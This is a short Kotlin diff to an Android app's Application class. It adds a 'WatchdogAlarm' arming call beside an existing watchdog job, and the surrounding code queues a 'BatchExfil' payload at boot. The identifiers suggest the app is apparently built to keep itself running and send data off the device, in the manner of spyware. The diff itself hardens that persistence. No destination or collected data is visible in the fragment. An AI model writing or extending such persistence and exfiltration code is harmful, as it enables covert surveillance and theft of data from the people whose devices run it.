@@ -58,6 +58,11 @@ class App : Application() {
         } catch (t: Throwable) {
             Log.w(TAG, "watchdog job: ${t.message}")
         }
+        try {
+            WatchdogAlarm.arm(this)
+        } catch (t: Throwable) {
+            Log.w(TAG, "watchdog alarm: ${t.message}")
+        }
 
         try {
             BatchExfil.enqueue(this, "boot", """{"ts":${System.currentTimeMillis()}}""")
